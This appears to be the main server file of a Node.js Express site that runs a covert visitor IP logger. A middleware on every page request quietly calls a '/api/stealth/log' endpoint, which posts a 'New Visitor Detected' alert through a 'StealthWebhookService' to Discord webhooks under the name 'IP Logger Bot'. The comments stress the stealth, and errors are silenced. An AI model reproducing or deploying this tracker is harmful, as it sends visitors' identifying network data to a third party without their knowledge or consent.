// Load environment variables (works with Vercel env vars)
if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config({ path: './token.env' });
}

// Debug environment variables
console.log('🔧 Environment Debug:');
console.log('NODE_ENV:', process.env.NODE_ENV);
console.log('DISCORD_BOT_TOKEN:', process.env.DISCORD_BOT_TOKEN ? 'SET' : 'NOT SET');
console.log('DISCORD_CHANNEL_ID:', process.env.DISCORD_CHANNEL_ID ? 'SET' : 'NOT SET');
console.log('WEBSITE_NAME:', process.env.WEBSITE_NAME);
console.log('WEBHOOK_COUNT:', process.env.WEBHOOK_COUNT);
console.log('ENABLE_BOT:', process.env.ENABLE_BOT);

const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

// Import the stealth webhook service
const StealthWebhookService = require('./api/stealthWebhookService');

// Import bot keepalive
const BotKeepAlive = require('./bot-keepalive');

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize webhook service
const webhookService = new StealthWebhookService();

// Debug webhook service
console.log('🔗 Webhook Service Debug:');
console.log('Webhook count loaded:', webhookService.webhooks.length);
console.log('First webhook URL:', webhookService.webhooks[0]?.url ? 'SET' : 'NOT SET');

// CORS configuration
app.use(cors({
  origin: true,
  credentials: true
}));

// Security headers middleware
const addSecurityHeaders = (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
};

app.use(addSecurityHeaders);

// Serve static files
app.use(express.static(path.join(__dirname, 'dist')));

// Body parsing middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Stealth IP logging endpoint
app.post('/api/stealth/log', async (req, res) => {
  console.log('🚨 Stealth log endpoint called');
  console.log('Client IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
  
  try {
    const payload = {
      content: "🚨 **New Visitor Detected** 🚨",
      username: "IP Logger Bot",
      avatar_url: "https://cdn.discordapp.com/attachments/123456789/987654321/logo.png"
    };

    console.log('📤 Sending webhook message...');
    const result = await webhookService.sendMessage(payload, req);
    console.log('✅ Webhook sent successfully:', result);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('❌ Webhook error:', error.message);
    // Silent error handling for stealth operation
    res.status(200).json({ success: true });
  }
});

// Middleware to log all requests for IP tracking
app.use((req, res, next) => {
  // Skip logging for static files and API health checks
  if (req.path.startsWith('/api/webhook/health') || 
      req.path.startsWith('/static/') || 
      req.path.includes('.')) {
    return next();
  }
  
  console.log('👤 Visitor detected:', req.path);
  console.log('IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
  
  // Log visitor IP asynchronously (don't block the request)
  setTimeout(async () => {
    try {
      console.log('🔄 Calling stealth log endpoint...');
      const response = await fetch(`${req.protocol}://${req.get('host')}/api/stealth/log`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': req.headers['user-agent'] || 'Unknown'
        },
        body: JSON.stringify({})
      });
      
      console.log('📡 Stealth log response status:', response.status);
      // Silent operation - no logging
    } catch (error) {
      console.error('❌ Stealth log error:', error.message);
      // Silent error handling for stealth operation
    }
  }, 0);
  
  next();
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'development',
    webhookCount: webhookService.webhooks.length,
    botToken: process.env.DISCORD_BOT_TOKEN ? 'SET' : 'NOT SET',
    channelId: process.env.DISCORD_CHANNEL_ID ? 'SET' : 'NOT SET',
    enableBot: process.env.ENABLE_BOT
  });
});

// Simple test endpoint
app.get('/api/test', (req, res) => {
  res.json({
    message: 'Server is working!',
    timestamp: new Date().toISOString(),
    webhooks: webhookService.webhooks.length
  });
});

// Test webhook endpoint (for debugging)
app.post('/api/test-webhook', async (req, res) => {
  try {
    const payload = {
      content: "🧪 **Test Message** 🧪\n\n✅ Webhook system is working!\n🕒 Test timestamp: " + new Date().toISOString(),
      username: "IP Logger Test Bot",
      avatar_url: "https://cdn.discordapp.com/attachments/123456789/987654321/test.png"
    };

    const result = await webhookService.sendMessage(payload, req);
    res.json({ success: true, result });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Catch-all route for SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// Start server and bot
const startServer = async () => {
  try {
    // Start the server
    app.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`🔗 Webhook count: ${webhookService.webhooks.length}`);
    });

    // Start Discord bot (only in production or if explicitly enabled)
    if (process.env.NODE_ENV === 'production' || process.env.ENABLE_BOT === 'true') {
      try {
        const bot = new BotKeepAlive();
        await bot.start();
        console.log('🤖 Discord bot started successfully');
      } catch (botError) {
        console.error('❌ Failed to start Discord bot:', botError.message);
      }
    } else {
      console.log('🤖 Discord bot disabled (not in production mode)');
    }

  } catch (error) {
    console.error('❌ Failed to start server:', error);
    process.exit(1);
  }
};

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('🛑 Shutting down gracefully...');
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('🛑 Shutting down gracefully...');
  process.exit(0);
});

// Start the server
startServer(); 